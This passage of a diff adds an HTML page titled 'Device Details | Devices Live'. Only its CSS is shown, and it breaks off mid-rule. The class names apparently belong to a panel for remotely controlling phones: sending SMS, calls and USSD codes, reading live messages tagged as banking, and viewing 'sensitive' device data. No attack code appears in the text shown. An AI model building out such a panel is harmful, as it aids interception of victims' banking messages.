@@ -1,0 +1,4302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Device Details | Devices Live</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"/>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+
+<style>
+/* ================== GLOBAL RESET ================== */
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+:root {
+  --primary: #2563eb;
+  --primary-light: #dbeafe;
+  --primary-dark: #1e40af;
+  --primary-gradient: linear-gradient(135deg, #2563eb, #3b82f6);
+  --secondary: #10b981;
+  --secondary-dark: #059669;
+  --danger: #ef4444;
+  --danger-light: #fef2f2;
+  --warning: #f59e0b;
+  --warning-light: #fffbeb;
+  --gray-50: #f9fafb;
+  --gray-100: #f3f4f6;
+  --gray-200: #e5e7eb;
+  --gray-300: #d1d5db;
+  --gray-400: #9ca3af;
+  --gray-500: #6b7280;
+  --gray-600: #4b5563;
+  --gray-700: #374151;
+  --gray-800: #1f2937;
+  --gray-900: #111827;
+  --shadow-sm: 0 1px 2px rgba(0, 0, 0, 0.05);
+  --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+  --shadow-md: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
+  --shadow-lg: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+  --radius-sm: 8px;
+  --radius: 12px;
+  --radius-lg: 16px;
+  --transition: all 0.2s ease;
+  --transition-medium: all 0.3s ease;
+}
+
+body {
+  font-family: 'Inter', sans-serif;
+  background: #f8fafc;
+  color: var(--gray-800);
+  min-height: 100vh;
+  font-size: 14px;
+  line-height: 1.5;
+  padding-bottom: 20px;
+}
+
+/* ================== PAGE CONTAINER ================== */
+.page-container {
+  width: 100%;
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 16px;
+  padding-top: 80px;
+}
+
+/* ================== BLUE HEADER ================== */
+.header {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  z-index: 1000;
+  background: var(--primary-gradient);
+  border-bottom: 4px solid rgba(255, 255, 255, 0.2);
+  box-shadow: var(--shadow-md);
+  height: 64px;
+  display: flex;
+  align-items: center;
+  padding: 0 16px;
+}
+
+.header-inner {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  width: 100%;
+  max-width: 1200px;
+  margin: 0 auto;
+}
+
+.back-btn {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  width: 40px;
+  height: 40px;
+  border-radius: 50%;
+  background: rgba(255, 255, 255, 0.2);
+  color: white;
+  text-decoration: none;
+  cursor: pointer;
+  border: 2px solid rgba(255, 255, 255, 0.3);
+  font-size: 16px;
+  transition: var(--transition-medium);
+  backdrop-filter: blur(10px);
+}
+
+.back-btn:hover {
+  background: rgba(255, 255, 255, 0.3);
+  transform: translateX(-2px);
+  border-color: rgba(255, 255, 255, 0.5);
+}
+
+.header-title {
+  flex: 1;
+  font-size: 18px;
+  font-weight: 800;
+  color: white;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+}
+
+.live-badge {
+  background: linear-gradient(135deg, #ef4444, #dc2626);
+  color: white;
+  font-size: 10px;
+  padding: 2px 8px;
+  border-radius: 10px;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  border: 2px solid rgba(255, 255, 255, 0.4);
+  box-shadow: 0 4px 8px rgba(220, 38, 38, 0.3);
+  animation: pulse 2s infinite;
+}
+
+@keyframes pulse {
+  0%, 100% { transform: scale(1); }
+  50% { transform: scale(1.05); }
+}
+
+/* ================== PERMISSION ICON IN HEADER ================== */
+.permission-btn {
+  background: rgba(255, 255, 255, 0.15);
+  color: white;
+  border: 2px solid rgba(255, 255, 255, 0.3);
+  padding: 8px;
+  border-radius: var(--radius-sm);
+  cursor: pointer;
+  font-size: 16px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  width: 40px;
+  height: 40px;
+  transition: all var(--transition);
+  backdrop-filter: blur(10px);
+  margin-left: auto;
+}
+
+.permission-btn:hover {
+  background: rgba(255, 255, 255, 0.25);
+  transform: translateY(-2px);
+  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+}
+
+/* ================== USER INFO BUTTON IN HEADER ================== */
+.user-info-btn {
+  background: rgba(255, 255, 255, 0.15);
+  color: white;
+  border: 2px solid rgba(255, 255, 255, 0.3);
+  padding: 6px 12px;
+  border-radius: var(--radius-sm);
+  cursor: pointer;
+  visibility: hidden;
+  font-size: 13px;
+  font-weight: 600;
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  transition: all var(--transition);
+  backdrop-filter: blur(10px);
+  margin-left: 8px;
+}
+
+.user-info-btn:hover {
+  background: rgba(255, 255, 255, 0.25);
+  transform: translateY(-2px);
+  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+}
+
+/* ================== DEVICE HEADER COMPACT WITH BLUE STRAP ================== */
+.device-header {
+  background: white;
+  border-radius: var(--radius);
+  padding: 0;
+  margin-bottom: 16px;
+  border: 2px solid var(--gray-200);
+  box-shadow: var(--shadow);
+  position: relative;
+  overflow: hidden;
+}
+
+/* Blue strap at top */
+.device-header::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 6px;
+  background: var(--primary-gradient);
+  z-index: 1;
+}
+
+.device-header-content {
+  padding: 16px;
+  position: relative;
+  z-index: 2;
+}
+
+.device-id-row {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-bottom: 12px;
+  gap: 8px;
+}
+
+.device-id {
+  font-family: 'Roboto Mono', monospace;
+  font-size: 13px;
+  color: var(--gray-700);
+  background: var(--gray-50);
+  padding: 8px 12px;
+  border-radius: var(--radius-sm);
+  flex: 1;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  white-space: nowrap;
+  cursor: pointer;
+  transition: var(--transition);
+  border: 1px solid var(--gray-300);
+  font-weight: 600;
+}
+
+.device-id:hover {
+  background: var(--primary-light);
+  border-color: var(--primary);
+  color: var(--primary-dark);
+}
+
+.device-id::after {
+  content: "📋";
+  position: absolute;
+  right: 28px;
+  top: 50%;
+  transform: translateY(-50%);
+  font-size: 12px;
+  opacity: 0.6;
+}
+
+.last-seen {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  font-size: 13px;
+  font-weight: 600;
+  color: var(--primary-dark);
+  background: var(--primary-light);
+  padding: 8px 12px;
+  border-radius: var(--radius-sm);
+  border: 1px solid #bfdbfe;
+}
+
+/* ================== DEVICE MAIN INFO COMPACT ================== */
+.device-main-info {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  margin-bottom: 16px;
+}
+
+.device-icon {
+  width: 48px;
+  height: 48px;
+  background: linear-gradient(135deg, var(--primary-light), #e0f2fe);
+  border-radius: var(--radius-sm);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 24px;
+  color: var(--primary);
+  overflow: hidden;
+  border: 2px solid #bfdbfe;
+  box-shadow: 0 2px 6px rgba(37, 99, 235, 0.15);
+}
+
+.device-icon img {
+  width: 100%;
+  height: 100%;
+  object-fit: contain;
+  padding: 8px;
+}
+
+.device-details {
+  flex: 1;
+}
+
+.device-name {
+  font-size: 18px;
+  font-weight: 700;
+  color: var(--primary-dark);
+  margin-bottom: 4px;
+}
+
+.device-model {
+  font-size: 13px;
+  color: var(--gray-600);
+  background: var(--primary-light);
+  padding: 4px 10px;
+  border-radius: 20px;
+  display: inline-block;
+  font-weight: 600;
+  border: 1px solid #bfdbfe;
+}
+
+/* ================== SIM CARDS IN HEADER - BLUE THEME ================== */
+.sim-cards-compact {
+  display: grid;
+  grid-template-columns: repeat(2, 1fr);
+  gap: 10px;
+  margin-bottom: 16px;
+}
+
+.sim-card-compact {
+  background: white;
+  border-radius: var(--radius-sm);
+  padding: 12px;
+  border: 2px solid var(--gray-200);
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  cursor: pointer;
+  transition: var(--transition-medium);
+  position: relative;
+  overflow: hidden;
+}
+
+.sim-card-compact:hover {
+  background: var(--primary-light);
+  transform: translateY(-2px);
+  box-shadow: var(--shadow);
+  border-color: var(--primary);
+}
+
+/* Blue left border for SIM cards */
+.sim-card-compact::before {
+  content: '';
+  position: absolute;
+  left: 0;
+  top: 0;
+  width: 4px;
+  height: 100%;
+  background: var(--primary-gradient);
+}
+
+.sim-icon {
+  width: 36px;
+  height: 36px;
+  background: white;
+  border-radius: 8px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: var(--primary);
+  font-size: 16px;
+  border: 2px solid var(--gray-200);
+  flex-shrink: 0;
+}
+
+.sim-details-compact {
+  flex: 1;
+  position: relative;
+}
+
+.sim-label {
+  font-size: 11px;
+  color: var(--primary-dark);
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  font-weight: 700;
+  margin-bottom: 2px;
+  background: var(--primary-light);
+  padding: 2px 6px;
+  border-radius: 10px;
+  display: inline-block;
+}
+
+.sim-info {
+  display: flex;
+  flex-direction: column;
+  gap: 4px;
+}
+
+.sim-number {
+  font-size: 14px;
+  font-weight: 600;
+  color: var(--gray-800);
+  cursor: pointer;
+  padding: 4px 8px;
+  border-radius: 6px;
+  transition: var(--transition);
+  position: relative;
+  background: var(--gray-50);
+  border: 1px solid var(--gray-200);
+}
+
+.sim-number:hover {
+  background: var(--gray-100);
+  border-color: var(--primary);
+  color: var(--primary-dark);
+}
+
+.sim-number::after {
+  content: "📋";
+  position: absolute;
+  right: 8px;
+  top: 50%;
+  transform: translateY(-50%) scale(0.8);
+  font-size: 10px;
+  opacity: 0.6;
+}
+
+.sim-carrier {
+  font-size: 12px;
+  color: var(--gray-600);
+  display: flex;
+  align-items: center;
+  gap: 4px;
+}
+
+.sim-status-compact {
+  display: inline-flex;
+  align-items: center;
+  gap: 4px;
+  padding: 3px 8px;
+  border-radius: 12px;
+  font-size: 11px;
+  font-weight: 600;
+  border: 1px solid transparent;
+}
+
+.sim-status-compact.active {
+  background: #d1fae5;
+  color: var(--secondary-dark);
+  border-color: #a7f3d0;
+}
+
+.sim-status-compact.inactive {
+  background: var(--gray-200);
+  color: var(--gray-500);
+  border-color: var(--gray-300);
+}
+
+.sim-status-compact.unknown {
+  background: #fef3c7;
+  color: #d97706;
+  border-color: #fbbf24;
+}
+
+/* ================== ACTION BUTTONS - 2 ROWS (3 + 3) WITH BLUE THEME ================== */
+.action-buttons {
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+  margin-top: 0;
+}
+
+.button-row {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 10px;
+}
+
+.action-btn {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  padding: 12px 6px;
+  border-radius: var(--radius);
+  background: white;
+  border: 2px solid var(--gray-200);
+  font-size: 12px;
+  font-weight: 600;
+  color: var(--gray-800);
+  cursor: pointer;
+  transition: var(--transition-medium);
+  gap: 6px;
+  min-height: 80px;
+  width: 100%;
+  position: relative;
+  overflow: hidden;
+}
+
+.action-btn:hover {
+  transform: translateY(-3px);
+  box-shadow: var(--shadow-md);
+  border-color: var(--primary);
+}
+
+.action-btn::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 4px;
+  background: var(--primary-gradient);
+  opacity: 0;
+  transition: var(--transition);
+}
+
+.action-btn:hover::before {
+  opacity: 1;
+}
+
+.action-btn i {
+  font-size: 20px;
+  margin-bottom: 4px;
+  transition: var(--transition);
+}
+
+.action-btn.sms i { color: #2563eb; }
+.action-btn.call i { color: #10b981; }
+.action-btn.ussd i { color: #8b5cf6; }
+.action-btn.check i { color: #f59e0b; }
+.action-btn.data i { color: #06b6d4; }
+.action-btn.history i { color: #8b5cf6; }
+
+.action-btn:hover i {
+  transform: scale(1.1);
+}
+
+/* ================== MESSAGES CONTAINER - MESSAGES PAGE STYLE ================== */
+.messages-container {
+  width: 100%;
+  display: flex;
+  flex-direction: column;
+  gap: 24px;
+  overflow: visible !important;
+  margin-top: 20px;
+}
+
+.message-card {
+  background: white;
+  border-radius: var(--radius-lg);
+  padding: 0;
+  border: 2px solid var(--gray-200);
+  box-shadow: var(--shadow);
+  display: flex;
+  flex-direction: column;
+  position: relative;
+  cursor: pointer;
+  transition: all var(--transition-medium);
+  overflow: visible !important;
+  min-height: auto;
+  max-width: 100%;
+  margin: 0;
+}
+
+.message-card:hover {
+  transform: translateY(-3px);
+  box-shadow: var(--shadow-md);
+  border-color: var(--primary-light);
+}
+
+.message-card.expanded {
+  border-color: var(--primary);
+}
+
+.message-card.live {
+  border-left: 5px solid var(--danger);
+  animation: liveGlow 2s infinite;
+}
+
+/* Blue strap at top */
+.message-card::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 6px;
+  background: var(--primary-gradient);
+  z-index: 1;
+}
+
+/* Message header */
+.message-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 18px 24px 12px;
+  background: linear-gradient(to bottom, rgba(219, 234, 254, 0.3), transparent);
+  min-height: 56px;
+  position: relative;
+  z-index: 2;
+}
+
+.message-title-container {
+  flex: 1;
+}
+
+.message-main-title {
+  display: flex;
+  align-items: center;
+  flex-wrap: wrap;
+  gap: 12px;
+  margin-bottom: 0;
+}
+
+.message-date {
+  font-size: 16px;
+  font-weight: 700;
+  color: var(--primary-dark);
+  line-height: 1.3;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.message-date::before {
+  content: '';
+  width: 6px;
+  height: 6px;
+  background: var(--primary);
+  border-radius: 50%;
+  display: inline-block;
+}
+
+/* Device info row - REMOVED DEVICE ID COLUMN */
+.device-info-row {
+  display: flex;
+  align-items: center;
+  padding: 14px 24px;
+  background: white;
+  border-bottom: 1px solid var(--gray-200);
+  flex-wrap: wrap;
+  position: relative;
+  cursor: pointer;
+  transition: background var(--transition-fast);
+  gap: 20px;
+  overflow: visible !important;
+}
+
+.device-info-row:hover {
+  background: var(--primary-light);
+}
+
+.device-info-item {
+  display: flex;
+  align-items: flex-start;
+  gap: 10px;
+  font-size: 14px;
+  padding: 6px 0;
+  flex: 1;
+  min-width: 200px;
+  overflow: visible !important;
+}
+
+.device-info-item i {
+  color: var(--primary);
+  font-size: 15px;
+  width: 18px;
+  text-align: center;
+  margin-top: 2px;
+  flex-shrink: 0;
+}
+
+.device-info-content {
+  display: flex;
+  flex-direction: column;
+  gap: 4px;
+  flex: 1;
+  min-width: 0;
+  overflow: visible !important;
+  word-wrap: break-word;
+  word-break: break-word;
+}
+
+.device-label {
+  color: var(--gray-600);
+  font-weight: 600;
+  font-size: 13px;
+  white-space: nowrap;
+  flex-shrink: 0;
+}
+
+.device-value {
+  color: var(--gray-800);
+  font-weight: 600;
+  word-break: break-word;
+  overflow-wrap: break-word;
+  line-height: 1.4;
+  font-size: 14px;
+  width: 100%;
+  overflow: visible !important;
+  white-space: normal;
+}
+
+/* Message body display - FIXED CUT ISSUE */
+.msg-body-container {
+  padding: 0 24px 24px;
+  background: white;
+  cursor: pointer;
+  border-bottom: 1px solid var(--gray-200);
+  overflow: visible !important;
+  min-width: 0;
+}
+
+.msg-body-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 10px;
+  padding-top: 16px;
+  border-top: 2px solid var(--primary-light);
+}
+
+.message-body-display {
+  font-size: 14px;
+  line-height: 1.6;
+  color: var(--gray-800);
+  white-space: pre-wrap;
+  word-wrap: break-word;
+  padding: 16px;
+  background: var(--gray-50);
+  border-radius: var(--radius-md);
+  border: 2px solid var(--gray-200);
+  width: 100%;
+  min-height: 60px;
+  overflow-y: visible !important;
+  transition: all var(--transition-fast);
+  font-family: 'Inter', sans-serif;
+  letter-spacing: 0.2px;
+  resize: none;
+  box-sizing: border-box;
+  display: block;
+  max-width: 100%;
+  overflow: visible !important;
+}
+
+.message-body-display:hover {
+  background: var(--primary-light);
+  border-color: var(--primary);
+  transform: translateY(-2px);
+  box-shadow: var(--shadow-sm);
+}
+
+/* Message footer */
+.message-footer {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 14px 24px;
+  background: var(--gray-50);
+  flex-wrap: wrap;
+  gap: 10px;
+  overflow: visible !important;
+}
+
+.message-time {
+  font-size: 13px;
+  color: var(--gray-500);
+  font-weight: 600;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.message-stats {
+  font-size: 12px;
+  color: var(--gray-500);
+  font-weight: 500;
+  display: flex;
+  align-items: center;
+  gap: 15px;
+}
+
+.message-stat-item {
+  display: flex;
+  align-items: center;
+  gap: 5px;
+}
+
+/* Banking badge style */
+.banking-badge {
+  background: linear-gradient(135deg, var(--secondary), #047857);
+  color: white;
+  padding: 5px 12px;
+  border-radius: 20px;
+  font-size: 12px;
+  font-weight: 700;
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  border: 2px solid #047857;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  box-shadow: 0 2px 6px rgba(5, 150, 105, 0.2);
+}
+
+/* Copy button */
+.copy-btn {
+  background: var(--primary-light);
+  color: var(--primary);
+  border: 2px solid var(--primary);
+  padding: 6px 12px;
+  border-radius: var(--radius-sm);
+  font-size: 12px;
+  font-weight: 600;
+  cursor: pointer;
+  display: inline-flex;
+  align-items: center;
+  gap: 5px;
+  transition: all var(--transition-fast);
+}
+
+.copy-btn:hover {
+  background: var(--primary);
+  color: white;
+  transform: translateY(-1px);
+}
+
+/* ================== PANELS - BLUE THEME ================== */
+.panel {
+  background: white;
+  border-radius: var(--radius);
+  padding: 0;
+  margin-bottom: 16px;
+  border: 2px solid var(--gray-200);
+  box-shadow: var(--shadow);
+  display: none;
+  position: relative;
+  overflow: hidden;
+}
+
+.panel.active {
+  display: block;
+  animation: fadeIn 0.3s ease;
+}
+
+@keyframes fadeIn {
+  from { opacity: 0; transform: translateY(10px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+/* Blue strap for panels */
+.panel::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 6px;
+  background: var(--primary-gradient);
+}
+
+.panel-content {
+  padding: 16px;
+  position: relative;
+  z-index: 1;
+}
+
+.panel-header {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  margin-bottom: 16px;
+  padding-bottom: 12px;
+  border-bottom: 2px solid var(--gray-200);
+}
+
+.panel-header i {
+  font-size: 18px;
+  color: var(--primary);
+}
+
+.panel-title {
+  font-size: 16px;
+  font-weight: 700;
+  color: var(--primary-dark);
+}
+
+/* SIM Slot Selection Styling */
+.sim-option {
+  display: flex;
+  flex-direction: column;
+  gap: 2px;
+}
+
+.sim-option-number {
+  font-size: 11px;
+  color: var(--primary);
+  font-weight: 500;
+  background: var(--primary-light);
+  padding: 2px 6px;
+  border-radius: 10px;
+  display: inline-block;
+}
+
+/* Form styles */
+.form-group {
+  margin-bottom: 16px;
+}
+
+.form-label {
+  display: block;
+  margin-bottom: 6px;
+  font-size: 13px;
+  font-weight: 600;
+  color: var(--gray-700);
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+
+.form-label i {
+  color: var(--primary);
+}
+
+.form-input,
+.form-select,
+.form-textarea {
+  width: 100%;
+  padding: 10px 12px;
+  border: 2px solid var(--gray-300);
+  border-radius: var(--radius-sm);
+  font-size: 14px;
+  color: var(--gray-800);
+  background: white;
+  transition: var(--transition);
+  font-family: 'Inter', sans-serif;
+}
+
+.form-input:focus,
+.form-select:focus,
+.form-textarea:focus {
+  outline: none;
+  border-color: var(--primary);
+  box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
+}
+
+.form-textarea {
+  height: 100px;
+  resize: vertical;
+}
+
+.form-actions {
+  display: flex;
+  gap: 10px;
+  margin-top: 20px;
+}
+
+.btn {
+  flex: 1;
+  padding: 12px 16px;
+  border-radius: var(--radius-sm);
+  border: none;
+  font-size: 14px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: var(--transition-medium);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+}
+
+.btn-primary {
+  background: var(--primary-gradient);
+  color: white;
+  border: 2px solid var(--primary-dark);
+  box-shadow: 0 4px 12px rgba(37, 99, 235, 0.2);
+}
+
+.btn-primary:hover {
+  background: linear-gradient(135deg, var(--primary-dark), #1e3a8a);
+  transform: translateY(-2px);
+  box-shadow: 0 6px 20px rgba(37, 99, 235, 0.3);
+}
+
+.btn-secondary {
+  background: var(--gray-100);
+  color: var(--gray-700);
+  border: 2px solid var(--gray-300);
+}
+
+.btn-secondary:hover {
+  background: var(--gray-200);
+  transform: translateY(-2px);
+  border-color: var(--gray-400);
+}
+
+.btn-danger {
+  background: linear-gradient(135deg, var(--danger), #dc2626);
+  color: white;
+  border: 2px solid #dc2626;
+  box-shadow: 0 4px 12px rgba(239, 68, 68, 0.2);
+}
+
+.btn-danger:hover {
+  background: linear-gradient(135deg, #dc2626, #b91c1c);
+  transform: translateY(-2px);
+  box-shadow: 0 6px 20px rgba(239, 68, 68, 0.3);
+}
+
+/* ================== DEVICE DATA PANEL - NEW STYLING ================== */
+.device-data-panel {
+  background: white;
+  border-radius: var(--radius);
+  margin-bottom: 20px;
+  border: 2px solid var(--primary);
+  box-shadow: var(--shadow-md);
+  overflow: hidden;
+  position: relative;
+}
+
+.device-data-panel::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 8px;
+  background: var(--primary-gradient);
+  z-index: 1;
+}
+
+.device-data-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 16px 20px;
+  background: linear-gradient(to right, rgba(219, 234, 254, 0.3), rgba(219, 234, 254, 0.1));
+  border-bottom: 2px solid var(--gray-200);
+  cursor: pointer;
+  transition: var(--transition);
+  position: relative;
+  z-index: 2;
+}
+
+.device-data-header:hover {
+  background: linear-gradient(to right, rgba(219, 234, 254, 0.5), rgba(219, 234, 254, 0.3));
+}
+
+.device-data-header.expanded {
+  border-bottom-color: var(--primary);
+}
+
+.device-data-title {
+  font-size: 16px;
+  font-weight: 700;
+  color: var(--primary-dark);
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+
+.device-data-count {
+  background: var(--primary);
+  color: white;
+  padding: 4px 12px;
+  border-radius: 20px;
+  font-size: 12px;
+  font-weight: 700;
+  margin-left: 10px;
+}
+
+.device-data-toggle {
+  color: var(--primary);
+  font-size: 18px;
+  transition: var(--transition);
+}
+
+.device-data-header.expanded .device-data-toggle {
+  transform: rotate(180deg);
+}
+
+.device-data-content {
+  padding: 20px;
+  display: none;
+  position: relative;
+  z-index: 2;
+  background: white;
+}
+
+.device-data-content.expanded {
+  display: block;
+  animation: slideDown 0.3s ease;
+}
+
+@keyframes slideDown {
+  from {
+    opacity: 0;
+    transform: translateY(-10px);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+
+/* ================== DEVICE DATA SECTIONS STYLING ================== */
+.data-section {
+  background: white;
+  border-radius: var(--radius-sm);
+  padding: 0;
+  margin-bottom: 20px;
+  border: 2px solid var(--gray-200);
+  box-shadow: var(--shadow-sm);
+  overflow: hidden;
+}
+
+.data-section-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 14px 16px;
+  background: linear-gradient(to right, var(--primary-light), #eff6ff);
+  border-bottom: 2px solid var(--gray-200);
+  cursor: pointer;
+  transition: var(--transition);
+}
+
+.data-section-header:hover {
+  background: linear-gradient(to right, var(--primary-light), #dbeafe);
+}
+
+.data-section-title {
+  font-size: 15px;
+  font-weight: 700;
+  color: var(--primary-dark);
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+
+.data-section-count {
+  background: var(--primary);
+  color: white;
+  padding: 3px 10px;
+  border-radius: 12px;
+  font-size: 11px;
+  font-weight: 700;
+  margin-left: 8px;
+}
+
+.data-section-toggle {
+  color: var(--primary);
+  font-size: 16px;
+  transition: var(--transition);
+}
+
+.data-section-header.expanded .data-section-toggle {
+  transform: rotate(180deg);
+}
+
+.data-section-content {
+  padding: 0;
+  max-height: 0;
+  overflow: hidden;
+  transition: max-height 0.3s ease;
+  background: var(--gray-50);
+}
+
+.data-section-content.expanded {
+  max-height: 800px;
+  padding: 16px;
+}
+
+/* Data item styling */
+.data-item-container {
+  background: white;
+  border-radius: var(--radius-sm);
+  padding: 12px;
+  margin-bottom: 12px;
+  border: 1px solid var(--gray-200);
+  transition: var(--transition);
+}
+
+.data-item-container:hover {
+  transform: translateY(-2px);
+  box-shadow: var(--shadow-sm);
+  border-color: var(--primary);
+}
+
+.data-item-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 8px;
+  padding-bottom: 8px;
+  border-bottom: 1px solid var(--gray-200);
+}
+
+.data-item-timestamp {
+  font-size: 12px;
+  color: var(--gray-500);
+  font-weight: 600;
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+
+.data-item-id {
+  font-size: 11px;
+  color: var(--primary);
+  background: var(--primary-light);
+  padding: 2px 8px;
+  border-radius: 10px;
+  font-family: 'Roboto Mono', monospace;
+  font-weight: 600;
+}
+
+.data-item-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+  gap: 12px;
+}
+
+.data-item-row {
+  display: flex;
+  flex-direction: column;
+  gap: 4px;
+}
+
+.data-item-label {
+  font-size: 12px;
+  color: var(--gray-600);
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+
+.data-item-label i {
+  color: var(--primary);
+  font-size: 11px;
+  width: 14px;
+}
+
+.data-item-value {
+  font-size: 14px;
+  color: var(--gray-800);
+  font-weight: 500;
+  word-break: break-word;
+  padding: 6px 10px;
+  background: var(--gray-100);
+  border-radius: 6px;
+  border: 1px solid var(--gray-200);
+  font-family: 'Roboto Mono', monospace;
+  min-height: 36px;
+  display: flex;
+  align-items: center;
+}
+
+.data-item-value.sensitive {
+  background: linear-gradient(135deg, #fef3c7, #fde68a);
+  border-color: #fbbf24;
+  color: #92400e;
+}
+
+.data-item-value.important {
+  background: linear-gradient(135deg, #d1fae5, #a7f3d0);
+  border-color: #10b981;
+  color: #047857;
+}
+
+/* No data message */
+.no-data-message {
+  text-align: center;
+  padding: 40px 20px;
+  background: var(--gray-50);
+  border-radius: var(--radius-sm);
+  border: 2px dashed var(--gray-300);
+  margin: 20px 0;
+}
+
+.no-data-message i {
+  font-size: 32px;
+  color: var(--gray-400);
+  margin-bottom: 12px;
+}
+
+.no-data-message h3 {
+  font-size: 16px;
+  color: var(--gray-600);
+  margin-bottom: 8px;
+  font-weight: 700;
+}
+
+.no-data-message p {
+  font-size: 13px;
+  color: var(--gray-500);
+  max-width: 300px;
+  margin: 0 auto;
+}
+
+/* ================== HISTORY PANEL ================== */
+.history-panel {
+  display: none;
+}
+
+.history-panel.active {
+  display: block;
+}
+
+.history-list {
+  max-height: 400px;
+  overflow-y: auto;
+}
+
+.history-item {
+  background: white;
+  border-radius: var(--radius-sm);
+  padding: 12px;
+  margin-bottom: 10px;
+  border-left: 4px solid var(--gray-400);
+  transition: var(--transition);
+  border: 1px solid var(--gray-200);
+}
+
+.history-item:hover {
+  background: var(--gray-50);
+  transform: translateX(2px);
+  border-color: var(--primary);
+}
+
+.history-item.sms { 
+  border-left-color: #2563eb; 
+  background: #eff6ff; 
+  border-color: #bfdbfe;
+}
+
+.history-item.call { 
+  border-left-color: #10b981; 
+  background: #f0fdf4; 
+  border-color: #a7f3d0;
+}
+
+.history-item.ussd { 
+  border-left-color: #8b5cf6; 
+  background: #f5f3ff; 
+  border-color: #ddd6fe;
+}
+
+.history-item.check { 
+  border-left-color: #f59e0b; 
+  background: #fffbeb; 
+  border-color: #fde68a;
+}
+
+.history-item.live { 
+  border-left-color: #ef4444; 
+  background: #fef2f2; 
+  border-color: #fecaca;
+  animation: livePulse 1s ease;
+}
+
+.history-type {
+  font-size: 12px;
+  font-weight: 700;
+  color: var(--gray-700);
+  margin-bottom: 4px;
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+
+.history-details {
+  font-size: 13px;
+  color: var(--gray-700);
+  margin-bottom: 6px;
+}
+
+.history-time {
+  font-size: 11px;
+  color: var(--gray-500);
+  display: flex;
+  align-items: center;
+  gap: 4px;
+}
+
+/* ================== SMS PANEL ================== */
+.sms-panel.active {
+  display: block;
+}
+
+.sms-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-bottom: 16px;
+  flex-wrap: wrap;
+  gap: 8px;
+}
+
+.live-indicator {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  background: linear-gradient(135deg, #ef4444, #dc2626);
+  color: white;
+  padding: 4px 10px;
+  border-radius: 20px;
+  font-size: 11px;
+  font-weight: 700;
+  border: 2px solid rgba(255, 255, 255, 0.4);
+  animation: pulse 2s infinite;
+}
+
+/* ================== CHECK ONLINE POPUP - BLUE THEME ================== */
+.check-popup {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background: rgba(0, 0, 0, 0.85);
+  display: none;
+  align-items: center;
+  justify-content: center;
+  z-index: 10000;
